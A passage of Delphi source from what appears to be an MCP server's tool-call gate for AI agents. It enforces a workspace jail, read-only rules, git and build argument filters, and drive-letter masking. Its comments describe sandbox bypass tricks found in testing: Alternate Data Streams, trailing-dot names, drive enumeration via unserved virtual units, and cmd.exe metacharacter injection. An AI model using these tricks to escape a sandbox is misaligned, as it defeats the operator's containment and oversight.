  V := ArgStr(AArguments, 'port').Trim;
  if V <> '' then
    if not TryStrToInt(V, N) or (N < 1) or (N > 65535) then
      Exit(Format(SR_PASERVER_PORT_FMT, [V]));
  V := ArgStr(AArguments, 'platform').Trim;
  if (V <> '') and not MatchText(V, PACLIENT_PLATFORMS) then
    Exit(Format(SR_PASERVER_PLATFORM_FMT, [V]));
  V := ArgStr(AArguments, 'password');
  for C in V do
    if (C < ' ') or (C = '"') then
      Exit(SR_PASERVER_PASSWORD);
end;

{ '' unless APath IS one of the configured roots (the jail itself). With no
  roots configured (unrestricted local mode) there is no jail to protect and
  nothing is refused - same model as PathDenied. }
function RootItselfDenied(const APath: string): string;
var
  R, Full: string;
begin
  Result := '';
  if APath.Trim = '' then
    Exit;
  try
    Full := IncludeTrailingPathDelimiter(TPath.GetFullPath(APath));
  except
    Exit; // an unparseable path is PathDenied's business, not ours
  end;
  for R in WorkspaceRoots do
    if SameText(R, Full) then
      Exit(Format(SR_ROOT_ITSELF_FMT, [ExcludeTrailingPathDelimiter(R)]));
end;

// Parameter ALIASES, per tool, applied only when the real name is absent:
// the same idea is spelled query / pattern / filter across tools and an
// agent that learned one spelling loses a call ("Unknown parameter") on the
// next tool (measured 2026-08-23: three in a 25-minute session). Never an
// alias that the tool already declares with another meaning (delphi_search
// has both query and pattern). The declared name stays the documented one.
procedure ApplyArgAliases(const AToolName: string; AArguments: TJSONObject);
const
  // tool, alias, real
  Aliases: array [0 .. 20, 0 .. 2] of string = (
    // "path" is what almost every other tool calls it; delphi_list calls it
    // "root" and delphi_projects too. Each spelling cost a wasted call
    // (measured 2026-08-25), and the fix is free: accept both.
    ('delphi_list', 'path', 'root'),
    ('delphi_list', 'dir', 'root'),
    ('delphi_projects', 'path', 'root'),
    // add-unit/remove-unit take "path"; "unit" is what everybody types first.
    ('delphi_config', 'unit', 'path'),
    ('delphi_config', 'file', 'path'),
    // Names that cost a call every time somebody guessed the obvious one.
    ('delphi_read', 'from', 'fromline'),
    ('delphi_read', 'to', 'toline'),
    ('delphi_search', 'path', 'root'),
    ('delphi_report', 'body', 'message'),
    ('delphi_report', 'text', 'message'),
    ('vault_search', 'query', 'pattern'),
    ('vault_search', 'filter', 'pattern'),
    ('delphi_list', 'filter', 'pattern'),
    ('delphi_list', 'mask', 'pattern'),
    ('delphi_components', 'pattern', 'filter'),
    ('delphi_components', 'query', 'filter'),
    ('delphi_read', 'startline', 'fromline'),
    ('delphi_read', 'endline', 'toline'),
    ('delphi_search', 'text', 'query'),
    ('vault_read', 'linecount', 'limit'),
    ('delphi_designer', 'class', 'classname'));
var
  I: Integer;
  P: TJSONPair;
begin
  if not Assigned(AArguments) then
    Exit;
  for I := Low(Aliases) to High(Aliases) do
  begin
    if not SameText(Aliases[I, 0], AToolName) then
      Continue;
    P := nil;
    for var Q in AArguments do
      if TMCPSerializer.NormalizeKey(Q.JsonString.Value) =
         TMCPSerializer.NormalizeKey(Aliases[I, 1]) then
      begin
        P := Q;
        Break;
      end;
    if P = nil then
      Continue;
    if ArgStr(AArguments, Aliases[I, 2]) <> '' then
    begin
      // the real name is there: it wins; the alias is dropped, not refused
      AArguments.RemovePair(P.JsonString.Value).Free;
      Continue;
    end;
    var V := P.JsonValue.Clone as TJSONValue;
    AArguments.RemovePair(P.JsonString.Value).Free;
    AArguments.AddPair(Aliases[I, 2], V);
  end;
end;

function ToolCallDenied(const AToolName: string;
  const AArguments: TJSONObject): string;
var
  Cmd, GitArgs, GitMsg: string;
begin
  // Duplicate parameter names FIRST, before normalization and before any other
  // check: two keys that normalize the same would let the gate inspect one
  // value while the binder hands the tool the other, and ExpandVirtualDrives
  // below rewrites by first exact name. Fail closed on the ambiguity.
  Result := DuplicateArgDenied(AArguments);
  if Result <> '' then
    Exit;
  // Normalization second, unconditionally: virtual drive units in the
  // arguments become real server paths before any check or any tool.
  ExpandVirtualDrives(AArguments);
  ApplyArgAliases(AToolName, AArguments);
  Result := '';
  // Read-only comes FIRST for the tools it refuses outright. The argument
  // filters below are universal on purpose, but letting one of them answer
  // first meant a read-only server explained a git remote policy instead of
  // saying the obvious thing: nothing writes here (v0.62).
  if (GProcessReadOnly or GRequestReadOnly) and
     MatchText(AToolName, ['delphi_edit', 'delphi_textedit', 'delphi_create',
       'delphi_changeset', 'delphi_build', 'delphi_run', 'delphi_package',
       'delphi_upload', 'delphi_delete', 'delphi_move',
       'vault_append', 'vault_create', 'vault_patch']) then
    Exit(WriteDenied(AToolName));
  // ...and the same for the WRITING half of delphi_git: on a read-only server
  // a clone has no business being explained in terms of remote policy.
  if (GProcessReadOnly or GRequestReadOnly) and SameText(AToolName, 'delphi_git') then
  begin
    Cmd := ArgStr(AArguments, 'command');
    if not (MatchText(Cmd, ['status', 'diff', 'log', 'show']) or
            (MatchText(Cmd, ['branch', 'tag']) and
             (Trim(ArgStr(AArguments, 'args')) = '') and
             (Trim(ArgStr(AArguments, 'message')) = ''))) then
      Exit(WriteDenied(Trim('delphi_git ' + Cmd)));
  end;
  // Universal git-argument filter (BOTH access levels): a dangerous option
  // would let even a read-write client escape the jail. The single place git
  // freeform args are vetted.
  if SameText(AToolName, 'delphi_git') and Assigned(AArguments) then
  begin
    GitArgs := ArgStr(AArguments, 'args');
    Result := GitArgDenied(GitArgs);
    if Result <> '' then
      Exit;
    // An explicit URL anywhere in a git call is an outbound connection this
    // machine is about to make. It goes through the operator's allowlist -
    // args AND message, because clone carries the URL in the latter.
    Result := GitRemoteDenied(GitArgs);
    if Result = '' then
      Result := GitRemoteDenied(ArgStr(AArguments, 'message'));
    if Result <> '' then
      Exit;
  end;
  // Universal build-argument filter (BOTH access levels): platform, config and
  // target land in a cmd.exe line, so a metacharacter there is arbitrary
  // execution - and it would sail past AllowRun, the jail, the sandbox and the
  // .dproj hazard scanner in a single call.
  if SameText(AToolName, 'delphi_build') then
  begin
    Result := BuildArgDenied(AArguments);
    if Result <> '' then
      Exit;
  end;
  // The workspace ROOT is the jail, not a file: delete/move would relocate the
  // whole workspace and write its recoverable copy in the root's PARENT,
  // outside the roots. Refused for EVERY credential - a read-write agent does
  // it just as thoroughly as a read-only one would like to.
  if MatchText(AToolName, ['delphi_delete', 'delphi_move']) then
  begin
    Result := RootItselfDenied(ArgStr(AArguments, 'path'));
    if Result <> '' then
      Exit;
  end;
  // Universal execution block (BOTH access levels): this is a compile-only
  // development server; running a program here is off by design. Refused for
  // every credential unless the operator explicitly opted in (AllowRun).
  if SameText(AToolName, 'delphi_run') and not AllowRun then
    Exit(SR_RUN_DISABLED);
  // Universal PAServer-argument filter (BOTH access levels): profile name,
  // host, port, platform and password land on the paclient command line, and
  // the name becomes a file in %APPDATA%.
  if SameText(AToolName, 'delphi_paserver') then
  begin
    Result := PAServerArgDenied(AArguments);
    if Result <> '' then
      Exit;
  end;
  // Universal adb-argument filter (BOTH access levels): address and serial
  // land on the adb command line.
  if SameText(AToolName, 'delphi_adb') then
  begin
    Result := AdbArgDenied(AArguments);
    if Result <> '' then
      Exit;
  end;
  if not (GProcessReadOnly or GRequestReadOnly) then
    Exit;
  // Fully mutating tools: refused outright in read-only mode.
  if MatchText(AToolName, ['delphi_edit', 'delphi_textedit', 'delphi_create',
    'delphi_changeset',
    'delphi_build', 'delphi_run', 'delphi_package', 'delphi_upload',
    'delphi_delete', 'delphi_move',
    // The knowledge vault: reading is fine read-only, writing never is.
    'vault_append', 'vault_create', 'vault_patch']) then
    Exit(WriteDenied(AToolName));
  // delphi_config is mixed: "view" reads, "add-platform" writes the .dproj.
  if SameText(AToolName, 'delphi_config') then
  begin
    Cmd := ArgStr(AArguments, 'command');
    if (Trim(Cmd) = '') or SameText(Trim(Cmd), 'view') then
      Exit;
    Exit(WriteDenied('delphi_config ' + Cmd));
  end;
  // delphi_test is mixed: discover only looks; run builds and EXECUTES.
  if SameText(AToolName, 'delphi_test') then
  begin
    Cmd := Trim(ArgStr(AArguments, 'command'));
    if (Cmd = '') or SameText(Cmd, 'discover') then
      Exit;
    Exit(WriteDenied('delphi_test ' + Cmd));
  end;
  // delphi_styles is mixed: view/get/lint read; set/clone/build write.
  if SameText(AToolName, 'delphi_styles') then
  begin
    Cmd := Trim(ArgStr(AArguments, 'command'));
    if (Cmd = '') or MatchText(Cmd, ['view', 'get', 'lint']) then
      Exit;
    Exit(WriteDenied('delphi_styles ' + Cmd));
  end;
  // delphi_paserver is mixed: the listing commands read; add-profile writes a
  // connection profile on the server and test-connection dials the target
  // with its stored credential.
  if SameText(AToolName, 'delphi_paserver') then
  begin
    Cmd := Trim(ArgStr(AArguments, 'command'));
    if (Cmd = '') or MatchText(Cmd, ['platforms', 'packages', 'profiles']) then
      Exit;
    Exit(WriteDenied('delphi_paserver ' + Cmd));
  end;
  // delphi_adb is mixed: discovering, listing and reading the device log are
  // reads; attaching/detaching a device or installing an app are writes.
  if SameText(AToolName, 'delphi_adb') then
  begin
    Cmd := Trim(ArgStr(AArguments, 'command'));
    // Reads: looking at the device (list, log, screen) changes nothing.
    // connect/disconnect/install/run/tap/key mutate or execute -> write.
    if (Cmd = '') or MatchText(Cmd, ['discover', 'devices', 'logcat',
      'screenshot']) then
      Exit;
    Exit(WriteDenied('delphi_adb ' + Cmd));
  end;
  // delphi_git is mixed: query commands pass, anything that can change the
  // repo or the remote is refused ("branch"/"tag" only LIST when called
  // without arguments; with arguments they create -> write).
  if SameText(AToolName, 'delphi_git') then
  begin
    Cmd := ArgStr(AArguments, 'command');
    GitArgs := ArgStr(AArguments, 'args');
    GitMsg := ArgStr(AArguments, 'message');
    // Pure query commands pass. branch/tag only LIST when called with NO args
    // AND no message (a message makes tag annotated = a write).
    if MatchText(Cmd, ['status', 'diff', 'log', 'show']) or
       (MatchText(Cmd, ['branch', 'tag']) and (Trim(GitArgs) = '') and
        (Trim(GitMsg) = '')) then
      Exit;
    Exit(WriteDenied(Trim('delphi_git ' + Cmd)));
  end;
end;

function WorkspaceRoots: TArray<string>;
var
  Raw, IniPath, R: string;
  Ini: TIniFile;
  List: TStringList;
begin
  if not GLoaded then
  begin
    Raw := GetEnvironmentVariable('DELPHI_MCP_ROOTS');
    if Raw = '' then
    begin
      IniPath := TPath.Combine(TPath.GetDirectoryName(ParamStr(0)), 'settings.ini');
      if TFile.Exists(IniPath) then
      begin
        Ini := TIniFile.Create(IniPath);
        try
          Raw := Ini.ReadString('Workspace', 'Roots', '');
        finally
          Ini.Free;
        end;
      end;
    end;
    List := TStringList.Create;
    try
      for R in Raw.Split([';']) do
        // Quotes around a root (Roots="D:\My Projects") are a natural way to
        // write paths with spaces: tolerated and stripped. Spaces themselves
        // need no quoting (the separator is ';').
        if R.Trim.Trim(['"']).Trim <> '' then
        try
          List.Add(IncludeTrailingPathDelimiter(
            TPath.GetFullPath(R.Trim.Trim(['"']).Trim)));
        except
          // an unparseable root is ignored, never crashes the server
        end;
      GRoots := List.ToStringArray;
      // Fail CLOSED: if Roots was configured but nothing parsed, a typo must
      // never silently leave the server unrestricted.
      GRootsInvalid := (Raw.Trim <> '') and (Length(GRoots) = 0);
    finally
      List.Free;
    end;
    GLoaded := True;
  end;
  Result := GRoots;
end;

function WorkspaceJailSummary(out AWarning: Boolean): string;
var
  Roots: TArray<string>;
  Shown: TArray<string>;
  I: Integer;
begin
  Roots := WorkspaceRoots;
  if GRootsInvalid then
  begin
    AWarning := True;
    Result := 'Workspace jail: INVALID roots (fail-closed) - every ' +
      'disk-touching tool is refused. Fix [Workspace] Roots in settings.ini.';
  end
  else if Length(Roots) = 0 then
  begin
    AWarning := True;
    Result := 'Workspace jail: NONE - UNRESTRICTED local mode (agents may ' +
      'touch any path the service account can). Set [Workspace] Roots to confine.';
  end
  else
  begin
    AWarning := False;
    // Roots are stored with a trailing delimiter; drop it for readability.
    SetLength(Shown, Length(Roots));
    for I := 0 to High(Roots) do
      Shown[I] := ExcludeTrailingPathDelimiter(Roots[I]);
    Result := 'Workspace jail (roots, ' + Length(Roots).ToString + '): ' +
      string.Join('  |  ', Shown);
  end;
end;

{ Windows silently strips trailing dots/spaces from a file name, so a path
  like "X.pas." creates "X.pas" while any check on the literal string sees a
  different extension. Alternate Data Streams ("X.pas::$DATA") play the same
  trick. Measured bypass in the field test: both defeated the .pas guard of
  delphi_textedit. Any path whose final name would be normalized by the OS
  is refused outright - it is never a legitimate request. }
function PathAnomaly(const APath: string): string;
var
  Name, Rest, Units, List: string;
  C: Char;
begin
  Result := '';
  // A virtual unit that survived the inbound expansion is one this server does
  // not serve: it must be refused BY NAME, never resolved against the real
  // filesystem (that is what leaked the host's drive letters). Only when a
  // virtual namespace exists at all - with no served drive there is nothing to
  // mask and nothing to name.
  Units := ServedDriveLetters;
  C := VirtualUnitLetter(APath);
  if (Units <> '') and (C <> #0) and (Pos(C, Units) = 0) then
  begin
    for C in Units do
    begin
      if List <> '' then
        List := List + ', ';
      List := List + 'srv' + Char(Ord(C) + 32) + ':';
    end;
    Exit(Format(SR_UNIT_UNKNOWN_FMT, [APath, List]));
  end;
  // ':' is legal only as the drive separator (C:\...): anywhere else it
  // opens an Alternate Data Stream, which hides content from every check.
  Rest := APath;
  if (Length(Rest) >= 2) and (Rest[2] = ':') then
    Rest := Copy(Rest, 3, MaxInt);
  if Rest.Contains(':') then
    Exit(Format('RECHAZADO: la ruta "%s" contiene ":" fuera de la unidad ' +
      '(flujo alternativo de datos). Usa un nombre de fichero normal.', [APath]));
  // EVERY segment, not just the last: a folder named "notas " normalizes the
  // same way, and checking only the file name left the rest of the path to
  // slip through (field round 9 hit the same class in the vault resolver).
  for Name in ExcludeTrailingPathDelimiter(Rest).Split(['\', '/']) do
  begin
    if Name = '' then
      Continue;
    // "." and ".." are standard navigation, not a normalization trick: the
    // jail canonicalizes before deciding, so an escape via ".." is caught
    // there. Rejecting them here refused legitimate parent-directory paths.
    if (Name = '.') or (Name = '..') then
      Continue;
    if Name.Trim([' ']).TrimRight([' ', '.']) <> Name then
      Exit(Format('RECHAZADO: el nombre "%s" empieza o termina en punto o ' +
        'espacio; Windows los recorta al abrir el fichero, asi que el nombre ' +
        'real seria otro ("%s"). Pide el nombre exacto, sin adornos.',
        [Name, Name.Trim([' ']).TrimRight([' ', '.'])]));
  end;
end;

function PathDenied(const APath: string): string;
var
  Roots: TArray<string>;
  Full, R: string;
begin
  // Name normalization first: it applies with or without a jail configured.
  Result := PathAnomaly(APath);
  if Result <> '' then
    Exit;
  // The knowledge vault belongs to the vault_* tools ALONE, wherever it sits.
  // If it happens to live inside a workspace root, the code tools must still
  // keep out - otherwise delphi_edit could rewrite a note behind the vault's
  // back, skipping its automatic backup and its protected governance files.
  if InVault(APath) then
    Exit(SR_VAULT_NOT_CODE);
  Roots := WorkspaceRoots;
  if GRootsInvalid then
    Exit(SR_ROOTS_INVALID);
  if Length(Roots) = 0 then
    Exit; // no jail configured
  try
    Full := TPath.GetFullPath(APath);
  except
    Exit('RECHAZADO: ruta invalida: ' + APath);
  end;
  for R in Roots do
    if StartsText(R, IncludeTrailingPathDelimiter(Full)) then
      Exit;
  Result := Format(SR_JAIL_FMT, [APath, string.Join(' | ', Roots)]);
end;

var
  GLibLoaded: Boolean = False;
  GLibRoots: TArray<string>;

{ The read-only library zone: RAD Studio installation + IDE Library Search
  Path directories (installed components), canonicalized. Cached. }
{ Expands $(MACRO) against the IDE's own macro table (plus the few values
  that live outside it), repeatedly, since macros nest. Case-insensitive. }
function ExpandIdeMacros(const AText: string; AVars: TStrings): string;
var
  Pass, I: Integer;
  Name: string;
begin
  Result := AText;
  for Pass := 1 to 4 do
  begin
    if not Result.Contains('$(') then
      Break;
    for I := 0 to AVars.Count - 1 do
    begin
      Name := AVars.Names[I];
      if Name <> '' then
        Result := Result.Replace('$(' + Name + ')', AVars.ValueFromIndex[I],
          [rfReplaceAll, rfIgnoreCase]);
    end;
  end;
end;

procedure IdeMacroVars(const AInfo: TRadStudioInfo; ADest: TStrings);
var
  UserDocs, CommonDocs: string;
begin
  // The IDE's own macro table is authoritative: it carries
  // $(BDSCatalogRepositoryAllUsers), where the GetIt packages live
  // (FmxLinux, Android SDKs, PAServer installers). Without it those
  // paths were silently dropped - measured 2026-08-19.
  IdeEnvironmentVars(AInfo.Version, ADest);
  // Values that are NOT in that key (authoritative from rsvars.bat /
  // the install itself), added without overwriting the IDE's own.
  if ADest.Values['BDS'] = '' then
    ADest.Values['BDS'] := ExcludeTrailingPathDelimiter(AInfo.RootDir);
  if ADest.Values['BDSLIB'] = '' then
    ADest.Values['BDSLIB'] := ExcludeTrailingPathDelimiter(AInfo.RootDir) + '\lib';
  UserDocs := BdsUserDir(AInfo);
  if (UserDocs <> '') and (ADest.Values['BDSUSERDIR'] = '') then
    ADest.Values['BDSUSERDIR'] := UserDocs;
  CommonDocs := BdsCommonDir(AInfo);
  if (CommonDocs <> '') and (ADest.Values['BDSCOMMONDIR'] = '') then
    ADest.Values['BDSCOMMONDIR'] := CommonDocs;
  // Per-user catalog repository: sibling of the common one, under the
  // user's own documents root (the IDE exposes only the AllUsers one).
  if (ADest.Values['BDSCatalogRepository'] = '') and (UserDocs <> '') then
    ADest.Values['BDSCatalogRepository'] :=
      IncludeTrailingPathDelimiter(UserDocs) + 'CatalogRepository';
end;

function IdePlatformLibraryPaths(const AVersion, APlatform: string): TArray<string>;
var
  Installs: TArray<TRadStudioInfo>;
  Info: TRadStudioInfo;
  Vars, List: TStringList;
  Item, Expanded: string;
begin
  Result := nil;
  Installs := DiscoverAllRadStudios;
  for Info in Installs do
  begin
    if not Info.Found or not SameText(Info.Version, AVersion) then
      Continue;
    Vars := TStringList.Create;
    List := TStringList.Create;
    try
      IdeMacroVars(Info, Vars);
      Vars.Values['Platform'] := APlatform;
      for Item in IdeLibrarySearchPath(Info.Version, APlatform).Split([';']) do
      begin
        Expanded := ExpandIdeMacros(Item.Trim, Vars);
        if (Expanded = '') or Expanded.Contains('$(') or
           not TPath.IsPathRooted(Expanded) then
          Continue;
        try
          Expanded := ExcludeTrailingPathDelimiter(TPath.GetFullPath(Expanded));
        except
          Continue;
        end;
        if List.IndexOf(Expanded) < 0 then
          List.Add(Expanded);
      end;
      Result := List.ToStringArray;
    finally
      List.Free;
      Vars.Free;
    end;
    Exit;
  end;
end;

function LibraryRoots: TArray<string>;
var
  Installs: TArray<TRadStudioInfo>;
  Info: TRadStudioInfo;
  List, Vars: TStringList;
  Plat, Raw, Item, Expanded: string;
begin
  if not GLibLoaded then
  begin
    List := TStringList.Create;
    try
      // EVERY installation: reading the sources of any installed Delphi is
      // legitimate, and each one owns its packages and its catalog.
      Installs := DiscoverAllRadStudios;
      for Info in Installs do
      begin
        if not Info.Found then
          Continue;
        List.Add(IncludeTrailingPathDelimiter(TPath.GetFullPath(Info.RootDir)));
        Vars := TStringList.Create;
        try
          IdeMacroVars(Info, Vars);

          // The catalog repositories THEMSELVES, whole: every GetIt package
          // lives there (FmxLinux, LockBox...), and the Library Search Path
          // only points at its compiled Lib\ folder - what an agent actually
          // wants to read is the sibling source\. Also covers the Android
          // SDKs and the PAServer installers.
          for Item in TArray<string>.Create(Vars.Values['BDSCatalogRepositoryAllUsers'],
            Vars.Values['BDSCatalogRepository']) do
            if (Item <> '') and TPath.IsPathRooted(Item) then
            try
              Expanded := IncludeTrailingPathDelimiter(TPath.GetFullPath(Item));
              if List.IndexOf(Expanded) < 0 then
                List.Add(Expanded);
            except
              // never breaks the server
            end;

          // ALL platforms registered for this install, never a fixed pair:
          // Linux64, OSX64, Android64, iOSDevice64... each has its own path.
          for Plat in IdeLibraryPlatforms(Info.Version) do
          begin
            Vars.Values['Platform'] := Plat;
            Raw := IdeLibrarySearchPath(Info.Version, Plat);
            for Item in Raw.Split([';']) do
            begin
              Expanded := ExpandIdeMacros(Item.Trim, Vars);
              if (Expanded <> '') and not Expanded.Contains('$(') and
                 TPath.IsPathRooted(Expanded) then
              try
                Expanded := IncludeTrailingPathDelimiter(TPath.GetFullPath(Expanded));
                if List.IndexOf(Expanded) < 0 then
                  List.Add(Expanded);
                // A component's INSTALL ROOT is library territory too: the IDE
                // registers its Source\ (or a per-platform Lib\), and next to
                // it live Library\, Redist\, Examples\ - the native runtime
                // libraries a deployment must ship (field 2026-08-22: OBR's
                // libzbar.so in Library\Linux64, unreadable because only
                // Source\ was registered). One level up, never a drive root,
                // never above the IDE's own documents trees.
                Expanded := ExcludeTrailingPathDelimiter(Expanded);
                Expanded := TPath.GetDirectoryName(Expanded);
                if (Expanded <> '') and (Length(Expanded) > 3) and
                   (TPath.GetDirectoryName(Expanded) <> '') then
                begin
                  Expanded := IncludeTrailingPathDelimiter(Expanded);
                  if List.IndexOf(Expanded) < 0 then
                    List.Add(Expanded);
                end;
              except
                // an unparseable entry never breaks the server
              end;
            end;
          end;
        finally
          Vars.Free;
        end;
      end;
      GLibRoots := List.ToStringArray;
    finally
      List.Free;
    end;
    GLibLoaded := True;
  end;
  Result := GLibRoots;
end;

function LibraryReadRoots: TArray<string>;
begin
  if not LibraryZoneEnabled then
    Exit(nil); // announced as it is enforced: no zone, nothing to announce
  Result := LibraryRoots;
end;

function ReadPathDenied(const APath: string): string;
var
  Full, R: string;
begin
  Result := PathDenied(APath);
  if Result = '' then
    Exit;
  // Outside the jail - but READING library territory is legitimate.
  try
    Full := IncludeTrailingPathDelimiter(TPath.GetFullPath(APath));
  except
    Exit; // keep the invalid-path rejection
  end;
  if LibraryZoneEnabled then
    for R in LibraryRoots do
      if StartsText(R, Full) then
        Exit('');
  // Refused for reading: say that a library zone exists and how to see it.
  // Field 2026-08-22: an agent listed the PARENT of a registered component
  // folder, got the plain jail refusal, and concluded list and read disagreed.
  if Result.StartsWith('RECHAZADO') then
    Result := Result + ' ' + SN_READ_ZONE_HINT;
end;

// ---------------------------------------------------------------------------
// Virtual drive units (srvd:, srvc:, ...)
// ---------------------------------------------------------------------------

var
  GDrvLoaded: Boolean = False;
  GDrvLetters: string; // uppercase letters of every served drive, e.g. 'DC'

{ The drives that can legitimately appear in tool output: those hosting the
  workspace roots, the library zone (RAD Studio + components) and the
  knowledge vault. Cached. }
function ServedDriveLetters: string;

  procedure AddDriveOf(const APath: string);
  begin
    if (Length(APath) >= 2) and (APath[2] = ':') and
       CharInSet(APath[1], ['A'..'Z', 'a'..'z']) and
       (Pos(UpCase(APath[1]), GDrvLetters) = 0) then
      GDrvLetters := GDrvLetters + UpCase(APath[1]);
  end;

var
  R: string;
begin
  if not GDrvLoaded then
  begin
    GDrvLetters := '';
    for R in WorkspaceRoots do
      AddDriveOf(R);
    for R in LibraryRoots do
      AddDriveOf(R);
    // The vault is a served root of its OWN: it sits deliberately outside the
    // code jail and outside the library zone, so neither list carries it. A
    // vault on another letter used to leak that letter unmasked, and its
    // srvX: form did not resolve on the way in - it goes through the same
    // door as everybody else.
    AddDriveOf(VaultPath);
    GDrvLoaded := True;
  end;
  Result := GDrvLetters;
end;

{ The ONE place that recognizes the virtual-unit shape: 'srvd:', 'srvd:\x',
  'srvd:/x'. Returns the upper-case letter, or #0 when the value is not a
  virtual unit at all. Both the inbound expansion and the rejection of an
  unserved unit ask this - the shape is never re-tested by hand. }
function VirtualUnitLetter(const AValue: string): Char;
begin
  Result := #0;
  if (Length(AValue) >= 5) and StartsText('srv', AValue) and
     CharInSet(AValue[4], ['A'..'Z', 'a'..'z']) and (AValue[5] = ':') then
    if (Length(AValue) = 5) or CharInSet(AValue[6], ['\', '/']) then
      Result := UpCase(AValue[4]);
end;

{ 'srvd:\x' / 'srvd:/x' / bare 'srvd:' -> 'D:\x' ... Whole-value prefix match
  only; anything else comes back untouched (real paths keep working).
  Only a SERVED letter expands. Mapping an unserved 'srvz:' to the real 'Z:\'
  put a drive of the host into the rejection echo, and the outbound mask
  covers served letters only, so it travelled back raw: probing srva: .. srvz:
  enumerated the machine's drives (field round 10). An unserved unit now stays
  literal and PathAnomaly refuses it by name, without ever reaching disk. }
function ExpandDriveValue(const AValue: string): string;
var
  Letter: Char;
begin
  Result := AValue;
  Letter := VirtualUnitLetter(AValue);
  if (Letter <> #0) and (Pos(Letter, ServedDriveLetters) > 0) then
    Result := Letter + Copy(AValue, 5, MaxInt);
end;

{ Rewrites the string arguments of a tools/call in place. Content-carrying
  parameters are never touched: their text belongs to files/messages, not to
  the path namespace. }
procedure ExpandVirtualDrives(const AArguments: TJSONObject);
var
  I: Integer;
  P: TJSONPair;
  Names, Vals: TStringList;
  V, N: string;
begin
  if not Assigned(AArguments) then
    Exit;
  Names := TStringList.Create;
  Vals := TStringList.Create;
  try
    for I := 0 to AArguments.Count - 1 do
    begin
      P := AArguments.Pairs[I];
      if not (P.JsonValue is TJSONString) then
        Continue;
      if MatchText(P.JsonString.Value,
        ['new', 'old', 'content', 'data', 'message', 'code', 'args']) then
        Continue;
      V := TJSONString(P.JsonValue).Value;
      N := ExpandDriveValue(V);
      if N <> V then
      begin
        Names.Add(P.JsonString.Value);
        Vals.Add(N);
      end;
    end;
    for I := 0 to Names.Count - 1 do
    begin
      AArguments.RemovePair(Names[I]).Free;
      AArguments.AddPair(Names[I], Vals[I]);
    end;
  finally
    Names.Free;
    Vals.Free;
  end;
end;

function MaskDriveText(const AToolName, AText: string): string;
var
  Sb: TStringBuilder;
  Letters: string;
  I, L: Integer;
  C, PrevC: Char;
begin
  // delphi_read is the ONE exemption: its payload is the file's TEXT, which
  // may legitimately contain "D:\..." that an edit anchor must match
  // byte-for-byte. delphi_fetch is NOT exempt (fixed after field round 4):
  // its payload is base64, whose alphabet has neither ':' nor '%', so
  // masking can never corrupt it - while its "path" field must be
  // virtualized like every other path the client sees.
  // The vault tools are exempt on the same grounds: their payload is the
  // TEXT of a note, and an agent copies fragments of it verbatim to build the
  // "anchor" / "old_text" of a later vault_append / vault_patch. Masking it
  // would silently break every anchored write (the fragment would no longer
  // match the file on disk). Vault paths are relative and carry no drive
  // letter, and the vault is knowledge the operator chose to expose.
  // ...and an exception that ESCAPED a tool is not content either. The
  // dispatcher wraps ANY exception as "Error executing tool: <E.Message>", and
  // a Delphi I/O exception embeds the REAL absolute path (EFOpenError: 'Cannot
  // open file "D:\..."'), reachable on a locked or ACL-denied file - the read
  // paths have no try/except of their own. Case-SENSITIVE and the exact
  // wrapper token on purpose: a delphi_read result starts with the FILE NAME
  // and a note may start with "Error", so a loose case-insensitive 'error'
  // test would silently mask real content and break every anchored write built
  // on it.
  if MatchText(AToolName, ['delphi_read', 'vault_read', 'vault_search']) and
     not (AText.StartsWith('RECHAZADO') or AText.StartsWith('error') or
          AText.StartsWith('Error executing tool: ')) then
    Exit(AText);
  Letters := ServedDriveLetters;
  if (Letters = '') or (AText = '') then
    Exit(AText);
  Sb := TStringBuilder.Create(Length(AText) + 64);
  try
    I := 1;
    L := Length(AText);
    while I <= L do
    begin
      C := AText[I];
      // Any drive letter, not only the served ones. The mask was a C/D
      // allowlist, so E:\secret\x.inc or z:\... walked out untouched
      // (found 2026-08-25 by an auditor). Nothing real leaks on THIS machine
      // today - only C: and D: exist and both are mapped - but a root on
      // another drive, or a file referenced from one, would have. An
      // unmapped letter travels as srvx: : the reader learns there is a path
      // and learns nothing about where.
      if CharInSet(UpCase(C), ['A' .. 'Z']) then
      begin
        if I = 1 then
          PrevC := #0
        else
          PrevC := AText[I - 1];
        // ...but by the time this runs the text is already JSON, where a line
        // break is the two characters \ and n. That made the LETTER 'n' the
        // previous char for every path that starts a line, and the guard below
        // let it through unmasked: the real C:\Program Files... leaked in
        // multi-line fields (build outputTail) while the same path masked fine
        // inside single-line ones (errors[]). Measured, field round 8.
        if (I >= 3) and CharInSet(PrevC, ['n', 'r', 't']) and
           (AText[I - 2] = '\') then
          PrevC := #10;
        // A drive prefix only starts where the previous char is not a
        // letter/digit (keeps git's "HEAD:" and words intact).
        if not CharInSet(PrevC, ['A'..'Z', 'a'..'z', '0'..'9']) then
        begin
          // form A - plain path: <letter>:<separator> (D:\ or D:/)
          if (I + 2 <= L) and (AText[I + 1] = ':') and
             CharInSet(AText[I + 2], ['\', '/']) then
          begin
            if Pos(UpCase(C), Letters) > 0 then
              Sb.Append('srv').Append(Char(Ord(UpCase(C)) + 32)).Append(':')
            else
              Sb.Append('srvx:'); // a drive this server does not serve
            Inc(I, 2);
            Continue;
          end;
          // form B - percent-encoded colon in a file URI: <letter>%3A/ ...
          // (DelphiLSP answers with file:///D%3A/... - measured, R3-1).
          if (I + 4 <= L) and (AText[I + 1] = '%') and (AText[I + 2] = '3') and
             ((AText[I + 3] = 'A') or (AText[I + 3] = 'a')) and (AText[I + 4] = '/') then
          begin
            if Pos(UpCase(C), Letters) > 0 then
              Sb.Append('srv').Append(Char(Ord(UpCase(C)) + 32))
            else
              Sb.Append('srvx');
            Sb.Append(AText[I + 1]).Append(AText[I + 2]).Append(AText[I + 3]);
            Inc(I, 4);
            Continue;
          end;
        end;
      end;
      // form C - a UNC path, whose HOST names the machine and what it can
      // see. Two shapes, and both have to be told apart from an ordinary
      // separator: by the time this runs the text is usually JSON, where a
      // single \ is written \\ - so "C:\\Users" is NOT a UNC, and a first
      // attempt at this rule happily turned it into "srvc:\srvhost" and ate
      // the rest of the path (caught by the battery, same day).
      //   raw text: \\host\share   - two, after a delimiter, then a letter
      //   inside JSON: \\\\host   - four, then a letter
      if (C = '\') and (I + 4 <= L) and (AText[I + 1] = '\') and
         (AText[I + 2] = '\') and (AText[I + 3] = '\') and
         CharInSet(AText[I + 4], ['A'..'Z', 'a'..'z', '0'..'9']) and
         ((I = 1) or (AText[I - 1] <> '\')) then
      begin
        Sb.Append('\\\\srvhost');
        Inc(I, 4);
        while (I <= L) and not CharInSet(AText[I], ['\', '/', '"', ' ', #9]) do
          Inc(I);
        Continue;
      end;
